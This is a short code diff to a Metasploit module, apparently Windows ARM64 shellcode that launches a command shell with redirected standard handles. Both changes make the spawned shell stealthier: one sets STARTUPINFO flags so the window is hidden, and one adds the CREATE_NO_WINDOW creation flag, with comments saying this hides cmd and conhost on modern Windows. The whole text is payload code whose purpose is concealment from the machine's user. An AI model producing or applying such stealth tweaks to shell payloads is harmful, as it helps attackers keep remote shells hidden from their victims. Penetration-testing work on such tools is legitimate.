@@ -268,7 +268,8 @@ module MetasploitModule
 
         mov     w0, #0x68
         str     w0, [x11, #0x00]
-        mov     w0, #0x100
+        // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; wShowWindow stays 0 (SW_HIDE)
+        mov     w0, #0x101
         str     w0, [x11, #0x3C]
         str     x22, [x11, #0x50]
         str     x22, [x11, #0x58]
@@ -286,7 +287,8 @@ module MetasploitModule
         mov     x2, xzr
         mov     x3, xzr
         mov     w4, #1
-        mov     w5, wzr
+        // CREATE_NO_WINDOW — hides cmd/conhost on modern Windows (0x101 alone is not enough)
+        movz    w5, #0x0800, lsl #16
         mov     x6, xzr
         mov     x7, xzr
         stp     x11, x10, [sp]
